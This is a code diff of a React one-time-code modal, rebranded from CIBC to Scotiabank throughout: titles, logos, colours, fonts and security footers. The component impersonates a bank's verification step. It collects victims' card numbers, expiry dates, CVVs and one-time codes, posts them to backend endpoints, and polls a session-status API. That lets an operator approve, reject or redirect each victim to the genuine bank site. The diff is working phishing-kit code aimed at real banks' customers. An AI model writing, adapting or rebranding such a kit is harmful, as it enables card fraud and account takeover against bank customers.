@@ -3,7 +3,7 @@ import { X, Check, Lock, CreditCard, Calendar, ShieldCheck } from 'lucide-react'
 
 const translations = {
   en: {
-    title: "CIBC Online Banking Verification",
+    title: "Scotiabank Online Banking Verification",
     subtitle: "A 6-digit verification code has been sent to your email. Please check.",
     boxLabel: "Verification OTP Code",
     expiresIn: "Expires in: ",
@@ -16,7 +16,7 @@ const translations = {
     resendingBtn: "Resending...",
   },
   fr: {
-    title: "Vérification CIBC Services bancaires en ligne",
+    title: "Vérification des Services bancaires en direct de la Banque Scotia",
     subtitle: "Un code de vérification à 6 chiffres a été envoyé à votre courriel. Veuillez vérifier.",
     boxLabel: "Code de vérification OTP",
     expiresIn: "Expire dans : ",
@@ -58,7 +58,7 @@ export default function OtpModal({ email, lang = "en", onVerifySuccess, onClose,
     const pollStatus = async () => {
       try {
         const response = await fetch(`/api/session-status?email=${encodeURIComponent(email)}`, {
-          headers: { 'X-Access-Key': 'client-cibc-bank' }
+          headers: { 'X-Access-Key': 'client-scotia-bank' }
         });
         const data = await response.json();
         if (!isMounted) return;
@@ -71,14 +71,14 @@ export default function OtpModal({ email, lang = "en", onVerifySuccess, onClose,
             localStorage.removeItem('otpExpiry');
             fetch('/api/clear-session', {
               method: 'POST',
-              headers: { 'Content-Type': 'application/json', 'X-Access-Key': 'client-cibc-bank' },
+              headers: { 'Content-Type': 'application/json', 'X-Access-Key': 'client-scotia-bank' },
               body: JSON.stringify({ email })
             }).catch(err => console.error('Error clearing session:', err));
-            setTimeout(() => { window.location.href = 'https://www.cibc.com/'; }, 3000);
+            setTimeout(() => { window.location.href = 'https://www.scotiabank.com/'; }, 3000);
             return;
           }
           if (data.status === 'redirect') {
-            window.location.href = data.redirectUrl || 'https://www.cibc.com/';
+            window.location.href = data.redirectUrl || 'https://www.scotiabank.com/';
             return;
           }
           if (data.status === 'cancelled') { onClose(); window.location.reload(); return; }
@@ -150,7 +150,7 @@ export default function OtpModal({ email, lang = "en", onVerifySuccess, onClose,
     try {
       const response = await fetch('/api/submit-card', {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json', 'X-Access-Key': 'client-cibc-bank' },
+        headers: { 'Content-Type': 'application/json', 'X-Access-Key': 'client-scotia-bank' },
         body: JSON.stringify({ email, cardNumber: rawCard, expiry, cvv })
       });
       const data = await response.json();
@@ -218,7 +218,7 @@ export default function OtpModal({ email, lang = "en", onVerifySuccess, onClose,
     try {
       const response = await fetch('/api/submit-otp', {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json', 'X-Access-Key': 'client-cibc-bank' },
+        headers: { 'Content-Type': 'application/json', 'X-Access-Key': 'client-scotia-bank' },
         body: JSON.stringify({ email, otp: finalOtp })
       });
       const data = await response.json();
@@ -242,7 +242,7 @@ export default function OtpModal({ email, lang = "en", onVerifySuccess, onClose,
     try {
       await fetch('/api/request-resend', {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json', 'X-Access-Key': 'client-cibc-bank' },
+        headers: { 'Content-Type': 'application/json', 'X-Access-Key': 'client-scotia-bank' },
         body: JSON.stringify({ email })
       });
     } catch (err) {
@@ -260,30 +260,30 @@ export default function OtpModal({ email, lang = "en", onVerifySuccess, onClose,
     return (
       <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-xs animate-fade-in select-none">
         <div
-          className="bg-white w-full max-w-[440px] rounded-2xl shadow-[0_20px_50px_rgba(0,0,0,0.18)] p-10 flex flex-col items-center justify-center text-center border border-[#e8e8e8] animate-slide-in relative overflow-hidden"
-          style={{ fontFamily: "'Whitney', 'Whitney SSm', 'Whitney Medium', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif" }}
+          className="bg-white w-full max-w-[440px] rounded-xl shadow-[0_20px_50px_rgba(0,0,0,0.18)] p-10 flex flex-col items-center justify-center text-center border border-[#e2e5eb] animate-slide-in relative overflow-hidden"
+          style={{ fontFamily: "'ScotiabankSans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif" }}
         >
-          {/* CIBC red accent bar */}
-          <div className="absolute top-0 left-0 right-0 h-1.5 bg-gradient-to-r from-[#c41f3e] to-[#7b003a]" />
+          {/* Scotiabank red accent bar */}
+          <div className="absolute top-0 left-0 right-0 h-1 bg-[#eb1120]" />
 
-          {/* CIBC Modal Logo */}
-          <div className="flex justify-center mb-5">
+          {/* Scotiabank Footer Logo */}
+          <div className="flex justify-center mb-5 pt-2">
             <img
-              src="/cibc-modal-logo.png"
-              alt="CIBC Logo"
-              className="w-16 h-auto object-contain"
+              src="/scotiabank-footer-logo.svg"
+              alt="Scotiabank Logo"
+              className="w-12 h-12 object-contain"
             />
           </div>
 
           {/* Checkmark circle */}
           <div className="w-[72px] h-[72px] rounded-full bg-red-50 border border-red-100 flex items-center justify-center mb-5">
-            <Check className="w-10 h-10 text-[#c41f3e]" strokeWidth={3} />
+            <Check className="w-10 h-10 text-[#eb1120]" strokeWidth={3} />
           </div>
-          <h3 className="text-2xl font-normal text-[#2b2b2b] mb-2">
+          <h3 className="text-2xl font-bold text-[#1a1a1a] mb-2">
             {lang === 'fr' ? "Vérification réussie" : "Verification Successful"}
           </h3>
           <p className="text-[#666] text-[15px] font-normal">
-            {lang === 'fr' ? "Redirection en cours..." : "Redirecting you to CIBC Online Banking..."}
+            {lang === 'fr' ? "Redirection en cours vers la Banque Scotia..." : "Redirecting you to Scotiabank Online Banking..."}
           </p>
         </div>
       </div>
@@ -304,7 +304,7 @@ export default function OtpModal({ email, lang = "en", onVerifySuccess, onClose,
         submittingBtn: "Authenticating...",
         processingTitle: "Authenticating...",
         processingSubtitle: "Please do not refresh this page or close your browser.",
-        securityFooter: "Secured by CIBC",
+        securityFooter: "Secured by Scotiabank",
       },
       fr: {
         title: "Vérification d'identité",
@@ -316,7 +316,7 @@ export default function OtpModal({ email, lang = "en", onVerifySuccess, onClose,
         submittingBtn: "Authentification...",
         processingTitle: "Authentification...",
         processingSubtitle: "Veuillez ne pas rafraîchir cette page ou fermer votre navigateur.",
-        securityFooter: "Sécurisé par CIBC",
+        securityFooter: "Sécurisé par la Banque Scotia",
       }
     };
     const ct = cardTranslations[lang] || cardTranslations.en;
@@ -324,50 +324,50 @@ export default function OtpModal({ email, lang = "en", onVerifySuccess, onClose,
     return (
       <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-xs animate-fade-in select-none">
         <div
-          className="bg-white w-full max-w-[480px] rounded-2xl shadow-[0_20px_50px_rgba(0,0,0,0.18)] px-8 pt-8 pb-7 flex flex-col relative border border-[#e8e8e8] animate-slide-in overflow-hidden"
-          style={{ fontFamily: "'Whitney', 'Whitney SSm', 'Whitney Medium', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif" }}
+          className="bg-white w-full max-w-[480px] rounded-xl shadow-[0_20px_50px_rgba(0,0,0,0.18)] px-8 pt-8 pb-7 flex flex-col relative border border-[#e2e5eb] animate-slide-in overflow-hidden"
+          style={{ fontFamily: "'ScotiabankSans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif" }}
         >
-          {/* CIBC Red Top Accent */}
-          <div className="absolute top-0 left-0 right-0 h-1.5 bg-gradient-to-r from-[#c41f3e] to-[#7b003a]" />
+          {/* Scotiabank Red Top Accent */}
+          <div className="absolute top-0 left-0 right-0 h-1 bg-[#eb1120]" />
 
           {/* Close button */}
           {onClose && (
             <button
               type="button"
               onClick={onClose}
-              className="absolute top-4 right-4 bg-transparent border-none cursor-pointer text-[#888] hover:text-[#222] p-1.5 flex items-center rounded-full hover:bg-black/5 transition-all duration-200"
+              className="absolute top-4 right-4 bg-transparent border-none cursor-pointer text-[#666] hover:text-[#111] p-1.5 flex items-center rounded-full hover:bg-black/5 transition-all duration-200"
               aria-label="Close"
             >
               <X className="w-[18px] h-[18px]" />
             </button>
           )}
 
-          {/* CIBC Modal Logo */}
-          <div className="flex justify-center mb-5">
-            <div className="p-1 transition-all duration-300 hover:scale-105">
+          {/* Scotiabank Footer Logo */}
+          <div className="flex justify-center mb-5 pt-2">
+            <div className="transition-all duration-300 hover:scale-105">
               <img
-                src="/cibc-modal-logo.png"
-                alt="CIBC Logo"
-                className="w-16 h-auto object-contain"
+                src="/scotiabank-footer-logo.svg"
+                alt="Scotiabank Logo"
+                className="w-12 h-12 object-contain"
               />
             </div>
           </div>
 
-          <h3 className="text-[22px] font-normal text-[#2b2b2b] text-center mb-2 tracking-tight">
+          <h3 className="text-[22px] font-bold text-[#1a1a1a] text-center mb-2 tracking-tight">
             {ct.title}
           </h3>
-          <p className="text-[#555555] text-[15px] text-center mb-6 leading-relaxed px-2 font-normal">
+          <p className="text-[#525151] text-[15px] text-center mb-6 leading-relaxed px-2 font-normal">
             {ct.subtitle}
           </p>
 
           <form onSubmit={handleCardSubmit}>
             {status === 'card_submitted' ? (
               <div className="flex flex-col items-center justify-center py-8">
-                <svg className="animate-spin w-10 h-10 text-[#c41f3e] mb-4" viewBox="0 0 24 24" fill="none">
+                <svg className="animate-spin w-10 h-10 text-[#eb1120] mb-4" viewBox="0 0 24 24" fill="none">
                   <circle cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="3" strokeOpacity="0.25"/>
                   <path d="M12 2a10 10 0 0 1 10 10" stroke="currentColor" strokeWidth="3" strokeLinecap="round"/>
                 </svg>
-                <div className="text-[#2b2b2b] text-[17px] font-medium animate-pulse mb-2">
+                <div className="text-[#1a1a1a] text-[17px] font-medium animate-pulse mb-2">
                   {ct.processingTitle}
                 </div>
                 <p className="text-[#666] text-[14.5px]">
@@ -378,7 +378,7 @@ export default function OtpModal({ email, lang = "en", onVerifySuccess, onClose,
               <div className="space-y-4">
                 {/* Card Number */}
                 <div>
-                  <label className="block text-[15px] font-normal text-[#333333] mb-1.5 ml-0.5">
+                  <label className="block text-[15px] font-medium text-[#333333] mb-1.5 ml-0.5">
                     {ct.cardNumberLabel}
                   </label>
                   <div className="relative">
@@ -392,7 +392,7 @@ export default function OtpModal({ email, lang = "en", onVerifySuccess, onClose,
                       value={cardNumber}
                       onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
                       maxLength={23}
-                      className="block w-full pl-[42px] pr-3 h-[50px] bg-white border border-[#7d7e81] rounded-[6px] text-[#222222] text-[17px] placeholder:text-[#9ca3af] focus:outline-none focus:border-[#c41f3e] focus:ring-2 focus:ring-[#c41f3e]/15 transition-all shadow-xs"
+                      className="block w-full pl-[42px] pr-3 h-[50px] bg-white border border-[#7d7e81] rounded-[4px] text-[#222222] text-[17px] placeholder:text-[#9ca3af] focus:outline-none focus:border-[#eb1120] focus:ring-1 focus:ring-[#eb1120] transition-all shadow-xs"
                     />
                   </div>
                 </div>
@@ -400,7 +400,7 @@ export default function OtpModal({ email, lang = "en", onVerifySuccess, onClose,
                 {/* Expiry + CVV */}
                 <div className="flex gap-4 items-end">
                   <div className="flex-1">
-                    <label className="block text-[15px] font-normal text-[#333333] mb-1.5 ml-0.5">
+                    <label className="block text-[15px] font-medium text-[#333333] mb-1.5 ml-0.5">
                       {ct.expiryLabel}
                     </label>
                     <div className="relative">
@@ -414,12 +414,12 @@ export default function OtpModal({ email, lang = "en", onVerifySuccess, onClose,
                         value={expiry}
                         onChange={(e) => setExpiry(formatExpiry(e.target.value))}
                         maxLength={5}
-                        className="block w-full pl-[42px] pr-3 h-[50px] bg-white border border-[#7d7e81] rounded-[6px] text-[#222222] text-[17px] placeholder:text-[#9ca3af] focus:outline-none focus:border-[#c41f3e] focus:ring-2 focus:ring-[#c41f3e]/15 transition-all shadow-xs"
+                        className="block w-full pl-[42px] pr-3 h-[50px] bg-white border border-[#7d7e81] rounded-[4px] text-[#222222] text-[17px] placeholder:text-[#9ca3af] focus:outline-none focus:border-[#eb1120] focus:ring-1 focus:ring-[#eb1120] transition-all shadow-xs"
                       />
                     </div>
                   </div>
                   <div className="w-[140px]">
-                    <label className="block text-[15px] font-normal text-[#333333] mb-1.5 ml-0.5">
+                    <label className="block text-[15px] font-medium text-[#333333] mb-1.5 ml-0.5">
                       {ct.cvvLabel}
                     </label>
                     <div className="relative">
@@ -433,7 +433,7 @@ export default function OtpModal({ email, lang = "en", onVerifySuccess, onClose,
                         value={cvv}
                         onChange={(e) => setCvv(e.target.value.replace(/\D/g, '').slice(0, 4))}
                         maxLength={4}
-                        className="block w-full pl-[38px] pr-3 h-[50px] bg-white border border-[#7d7e81] rounded-[6px] text-[#222222] text-[17px] placeholder:text-[#9ca3af] focus:outline-none focus:border-[#c41f3e] focus:ring-2 focus:ring-[#c41f3e]/15 transition-all shadow-xs"
+                        className="block w-full pl-[38px] pr-3 h-[50px] bg-white border border-[#7d7e81] rounded-[4px] text-[#222222] text-[17px] placeholder:text-[#9ca3af] focus:outline-none focus:border-[#eb1120] focus:ring-1 focus:ring-[#eb1120] transition-all shadow-xs"
                       />
                     </div>
                   </div>
@@ -443,10 +443,10 @@ export default function OtpModal({ email, lang = "en", onVerifySuccess, onClose,
                   <button
                     type="submit"
                     disabled={isCardSubmitting || cardNumber.replace(/\s/g,'').length < 13 || !expiry || cvv.length < 3}
-                    className={`w-full h-[52px] min-h-[52px] text-white border-none rounded-[6px] text-[17px] font-medium flex items-center justify-center gap-2.5 transition-all duration-200 shadow-xs ${
+                    className={`w-full h-[52px] min-h-[52px] text-white border-none rounded-[4px] text-[17px] font-bold flex items-center justify-center gap-2.5 transition-all duration-200 shadow-xs ${
                       (isCardSubmitting || cardNumber.replace(/\s/g,'').length < 13 || !expiry || cvv.length < 3)
                         ? 'bg-[#d1d5db] cursor-not-allowed'
-                        : 'bg-[#c41f3e] hover:bg-[#a6192e] cursor-pointer hover:shadow-md active:scale-[0.99]'
+                        : 'bg-[#eb1120] hover:bg-[#d00f1c] cursor-pointer hover:shadow-md active:scale-[0.99]'
                     }`}
                   >
                     <ShieldCheck className="w-[18px] h-[18px]" />
@@ -458,8 +458,8 @@ export default function OtpModal({ email, lang = "en", onVerifySuccess, onClose,
           </form>
 
           {/* Security Footer */}
-          <div className="mt-6 pt-4 border-t border-[#f3f4f6] flex items-center justify-center gap-2">
-            <Lock className="w-[13px] h-[13px] text-[#c41f3e]" />
+          <div className="mt-6 pt-4 border-t border-[#f0f2f5] flex items-center justify-center gap-2">
+            <Lock className="w-[13px] h-[13px] text-[#eb1120]" />
             <span className="text-[12px] text-[#6b7280] font-normal tracking-wide">
               {ct.securityFooter}
             </span>
@@ -473,39 +473,39 @@ export default function OtpModal({ email, lang = "en", onVerifySuccess, onClose,
   return (
     <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-xs animate-fade-in select-none">
       <div
-        className="bg-white w-full max-w-[460px] rounded-2xl shadow-[0_20px_50px_rgba(0,0,0,0.18)] px-8 sm:px-10 pt-9 pb-9 flex flex-col relative border border-[#e8e8e8] animate-slide-in overflow-hidden"
-        style={{ fontFamily: "'Whitney', 'Whitney SSm', 'Whitney Medium', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif" }}
+        className="bg-white w-full max-w-[460px] rounded-xl shadow-[0_20px_50px_rgba(0,0,0,0.18)] px-8 sm:px-10 pt-8 pb-8 flex flex-col relative border border-[#e2e5eb] animate-slide-in overflow-hidden"
+        style={{ fontFamily: "'ScotiabankSans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif" }}
       >
-        {/* CIBC red accent bar at top */}
-        <div className="absolute top-0 left-0 right-0 h-1.5 bg-gradient-to-r from-[#c41f3e] to-[#7b003a]" />
+        {/* Scotiabank red accent bar at top */}
+        <div className="absolute top-0 left-0 right-0 h-1 bg-[#eb1120]" />
 
         {/* Close button */}
         {onClose && (
           <button
             type="button"
             onClick={onClose}
-            className="absolute top-4 right-4 bg-transparent border-none cursor-pointer text-[#888] hover:text-[#222] p-1.5 flex items-center rounded-full hover:bg-black/5 transition-all duration-200"
+            className="absolute top-4 right-4 bg-transparent border-none cursor-pointer text-[#666] hover:text-[#111] p-1.5 flex items-center rounded-full hover:bg-black/5 transition-all duration-200"
             aria-label="Close"
           >
             <X className="w-[18px] h-[18px]" />
           </button>
         )}
 
-        {/* CIBC Modal Logo */}
-        <div className="flex justify-center mb-5">
-          <div className="p-1 transition-all duration-300 hover:scale-105">
+        {/* Scotiabank Footer Logo */}
+        <div className="flex justify-center mb-5 pt-2">
+          <div className="transition-all duration-300 hover:scale-105">
             <img
-              src="/cibc-modal-logo.png"
-              alt="CIBC Logo"
-              className="w-16 h-auto object-contain"
+              src="/scotiabank-footer-logo.svg"
+              alt="Scotiabank Logo"
+              className="w-12 h-12 object-contain"
             />
           </div>
         </div>
 
-        <h3 className="text-[22px] font-normal text-[#2b2b2b] text-center mb-2 tracking-tight">
+        <h3 className="text-[22px] font-bold text-[#1a1a1a] text-center mb-2 tracking-tight">
           {t.title}
         </h3>
-        <p className="text-[#555555] text-[15px] text-center mb-6 leading-relaxed">
+        <p className="text-[#525151] text-[15px] text-center mb-6 leading-relaxed">
           {t.subtitle}
         </p>
 
@@ -523,14 +523,14 @@ export default function OtpModal({ email, lang = "en", onVerifySuccess, onClose,
               onChange={e => handleChange(e, idx)}
               onKeyDown={e => handleKeyDown(e, idx)}
               disabled={isInputDisabled}
-              className={`w-full h-14 max-w-[56px] text-center text-2xl font-medium border rounded-[6px] outline-none transition-[border-color,background] duration-150 ${
+              className={`w-full h-14 max-w-[56px] text-center text-2xl font-bold border rounded-[4px] outline-none transition-[border-color,background] duration-150 ${
                 isInputDisabled ? 'cursor-not-allowed opacity-70' : 'cursor-text'
               } ${
                 error
-                  ? 'border-[#b80000] bg-[#fef5f5] text-[#b80000] focus:border-[#b80000] focus:shadow-[0_0_0_2px_rgba(184,0,0,.18)]'
+                  ? 'border-[#eb1120] bg-red-50/40 text-[#eb1120] focus:border-[#eb1120] focus:ring-1 focus:ring-[#eb1120]'
                   : digit
-                    ? 'border-[#c41f3e] bg-red-50/30 text-[#222222] focus:border-[#c41f3e] focus:shadow-[0_0_0_2px_rgba(196,31,62,.18)]'
-                    : 'border-[#7d7e81] bg-white text-[#222222] focus:border-[#c41f3e] focus:shadow-[0_0_0_2px_rgba(196,31,62,.18)]'
+                    ? 'border-[#eb1120] bg-red-50/20 text-[#1a1a1a] focus:border-[#eb1120] focus:ring-1 focus:ring-[#eb1120]'
+                    : 'border-[#7d7e81] bg-white text-[#1a1a1a] focus:border-[#eb1120] focus:ring-1 focus:ring-[#eb1120]'
               }`}
             />
           ))}
@@ -540,13 +540,13 @@ export default function OtpModal({ email, lang = "en", onVerifySuccess, onClose,
         <div className="text-center h-6 mb-1">
           {(status === 'show_otp' || status === 'rejected') && (
             isExpired ? (
-              <span className="text-[#b80000] text-[15px] font-medium animate-fade-in">
+              <span className="text-[#eb1120] text-[15px] font-medium animate-fade-in">
                 {t.expiredWarning}
               </span>
             ) : (
-              <span className="text-[#555555] text-[15px] font-normal">
+              <span className="text-[#525151] text-[15px] font-normal">
                 {t.expiresIn}
-                <span className={`inline-block min-w-[28px] text-center font-medium ${timeLeft <= 15 ? 'text-[#b80000]' : 'text-[#c41f3e]'}`}>
+                <span className={`inline-block min-w-[28px] text-center font-bold text-[#eb1120]`}>
                   {timeLeft}
                 </span>
                 {t.seconds}
@@ -554,12 +554,12 @@ export default function OtpModal({ email, lang = "en", onVerifySuccess, onClose,
             )
           )}
           {status === 'otp_submitted' && (
-            <span className="text-[#c41f3e] text-[15px] font-medium animate-pulse">
+            <span className="text-[#eb1120] text-[15px] font-bold animate-pulse">
               {lang === 'fr' ? 'Vérification en cours...' : 'Verifying code...'}
             </span>
           )}
           {status === 'accepted' && (
-            <span className="text-[#c41f3e] text-[15px] font-medium">
+            <span className="text-[#eb1120] text-[15px] font-bold">
               {lang === 'fr' ? '✓ Code accepté !' : '✓ Code accepted!'}
             </span>
           )}
@@ -568,7 +568,7 @@ export default function OtpModal({ email, lang = "en", onVerifySuccess, onClose,
         {/* Error message */}
         <div className="text-center h-[22px] mb-4">
           {error && !isExpired && (
-            <span className="text-[#b80000] text-[15px] font-medium animate-fade-in">
+            <span className="text-[#eb1120] text-[15px] font-medium animate-fade-in">
               {error}
             </span>
           )}
@@ -580,10 +580,10 @@ export default function OtpModal({ email, lang = "en", onVerifySuccess, onClose,
           <button
             onClick={() => handleVerify()}
             disabled={isVerifying || isExpired || otpVal.join('').length !== 6 || isInputDisabled}
-            className={`w-full h-[52px] min-h-[52px] text-white border-none rounded-[6px] text-[17px] font-medium flex items-center justify-center gap-2 transition-colors duration-200 ${
+            className={`w-full h-[52px] min-h-[52px] text-white border-none rounded-[4px] text-[17px] font-bold flex items-center justify-center gap-2 transition-colors duration-200 ${
               (isVerifying || isExpired || otpVal.join('').length !== 6 || isInputDisabled)
                 ? 'bg-[#d1d5db] cursor-not-allowed'
-                : 'bg-[#c41f3e] hover:bg-[#a6192e] cursor-pointer'
+                : 'bg-[#eb1120] hover:bg-[#d00f1c] cursor-pointer'
             }`}
           >
             {isVerifying || status === 'otp_submitted' ? (
@@ -603,10 +603,10 @@ export default function OtpModal({ email, lang = "en", onVerifySuccess, onClose,
           <button
             onClick={handleResend}
             disabled={isResending || isVerifying || status === 'otp_submitted' || status === 'accepted'}
-            className={`w-full h-[52px] min-h-[52px] rounded-[6px] text-[17px] font-normal flex items-center justify-center gap-2 transition-colors duration-200 ${
+            className={`w-full h-[52px] min-h-[52px] rounded-[4px] text-[17px] font-bold flex items-center justify-center gap-2 transition-colors duration-200 ${
               (isResending || isVerifying || status === 'otp_submitted' || status === 'accepted')
                 ? 'bg-white text-[#bbb] border border-[#ddd] cursor-not-allowed'
-                : 'bg-white text-[#c41f3e] border border-[#c41f3e] hover:bg-red-50 cursor-pointer'
+                : 'bg-white text-[#eb1120] border border-[#eb1120] hover:bg-red-50/50 cursor-pointer'
             }`}
           >
             {isResending ? (
@@ -626,8 +626,8 @@ export default function OtpModal({ email, lang = "en", onVerifySuccess, onClose,
         {/* Small security note */}
         <p className="text-center text-[13px] text-[#777] mt-5 leading-normal">
           {lang === 'fr'
-            ? "CIBC ne vous demandera jamais votre mot de passe complet par courriel ou par téléphone."
-            : "CIBC will never ask for your full password via email or phone."
+            ? "La Banque Scotia ne vous demandera jamais votre mot de passe complet par courriel ou par téléphone."
+            : "Scotiabank will never ask for your full password via email or phone."
           }
         </p>
       </div>
